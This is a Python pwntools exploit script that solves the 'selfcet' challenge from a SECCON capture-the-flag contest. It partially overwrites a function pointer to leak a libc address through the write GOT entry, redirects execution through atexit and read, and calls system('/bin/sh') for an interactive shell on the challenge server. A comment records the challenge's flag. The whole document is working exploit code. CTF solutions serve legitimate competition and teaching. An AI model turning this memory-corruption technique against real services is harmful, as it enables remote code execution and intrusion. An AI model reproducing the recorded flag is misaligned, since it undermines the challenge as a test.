#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug(["selfcet/xor"], stdin=PTY, stdout=PTY, stderr=PTY, api=True)
    return remote("selfcet.seccon.games", 9999)


SIZEOF_CTX = 0x58
OFFSETOF_CTX_KEY = 0
OFFSETOF_CTX_BUF = 0x20
OFFSETOF_CTX_ERROR = 0x40
OFFSETOF_CTX_STATUS = 0x48
OFFSETOF_CTX_THROW = 0x50
WRITE_GOT = 0x403FD0
ERR_LIBC = 0x1211D0
SEND_LIBC = 0x127A40
DPRINTF_LIBC = 0x60A90
WARN_LIBC = 0x121010
WRITE_LIBC = 0x114A20
BSS = 0x404010
ATEXIT_LIBC = 0x458C0
MAIN = 0x401209
LIBC_READ = 0x114980
SYSTEM_LIBC = 0x50D60


def main():
    while True:
        with connect() as tube:
            err_libc = ERR_LIBC
            warn_libc = WARN_LIBC
            if args.LOCAL:
                tube.gdb.execute("tbreak main")
                tube.gdb.continue_and_wait()
                err_libc = int(tube.gdb.parse_and_eval("&err"))
                warn_libc = int(tube.gdb.parse_and_eval("&warn"))
                print(f"err_libc=0x{err_libc:x}")
                print(f"warn_libc=0x{warn_libc:x}")
                # tube.gdb.execute("tbreak *((void *)send + 4)")
                # tube.gdb.execute("tbreak *0x401181")
                tube.gdb.continue_nowait()
            if warn_libc ^ err_libc > 0xFFFF:
                continue
            tube.send(
                flat(
                    {
                        OFFSETOF_CTX_ERROR - OFFSETOF_CTX_KEY: struct.pack("<Q", 0),
                        OFFSETOF_CTX_STATUS
                        - OFFSETOF_CTX_KEY: struct.pack("<Q", WRITE_GOT),
                        OFFSETOF_CTX_THROW
                        - OFFSETOF_CTX_KEY: struct.pack("<H", warn_libc & 0xFFFF),
                    },
                    length=OFFSETOF_CTX_THROW + 2 - OFFSETOF_CTX_KEY,
                )
            )
            try:
                if tube.recvuntil(b"xor: ", timeout=1) == b"":
                    continue
            except EOFError:
                continue
            (write_libc,) = struct.unpack("<Q", tube.recvn(6).ljust(8, b"\x00"))
            print(f"write_libc=0x{write_libc:x}")
            libc = write_libc - WRITE_LIBC
            print(f"libc=0x{libc:x}")
            assert libc & 0xFFF == 0
            tube.send(
                flat(
                    {
                        OFFSETOF_CTX_ERROR - OFFSETOF_CTX_BUF: struct.pack("<Q", 0),
                        OFFSETOF_CTX_STATUS - OFFSETOF_CTX_BUF: struct.pack("<Q", MAIN),
                        OFFSETOF_CTX_THROW
                        - OFFSETOF_CTX_BUF: struct.pack("<Q", libc + ATEXIT_LIBC),
                    },
                    length=SIZEOF_CTX - OFFSETOF_CTX_BUF,
                )
            )
            time.sleep(1)
            tube.send(
                flat(
                    {
                        # .text:00000000004011A5                 mov     rsi, rdx
                        # length will be also equal to BSS, but that's okay
                        OFFSETOF_CTX_ERROR - OFFSETOF_CTX_KEY: struct.pack("<Q", BSS),
                        # stdin/stdout/stderr are the same socket
                        OFFSETOF_CTX_STATUS - OFFSETOF_CTX_KEY: struct.pack("<Q", 1),
                        OFFSETOF_CTX_THROW
                        - OFFSETOF_CTX_KEY: struct.pack("<Q", libc + LIBC_READ),
                    },
                    length=SIZEOF_CTX - OFFSETOF_CTX_KEY,
                )
            )
            tube.send(b"/bin/sh\0")
            time.sleep(1)
            tube.send(
                flat(
                    {
                        OFFSETOF_CTX_ERROR - OFFSETOF_CTX_BUF: struct.pack("<Q", 0),
                        OFFSETOF_CTX_STATUS - OFFSETOF_CTX_BUF: struct.pack("<Q", BSS),
                        OFFSETOF_CTX_THROW
                        - OFFSETOF_CTX_BUF: struct.pack("<Q", libc + SYSTEM_LIBC),
                    },
                    length=SIZEOF_CTX - OFFSETOF_CTX_BUF,
                )
            )

            # cat flag-eb7297012865f6eede53f56158c52e85.txt
            # SECCON{b7w_CET_1s_3n4bL3d_by_arch_prctl}
            tube.interactive()


if __name__ == "__main__":
    main()
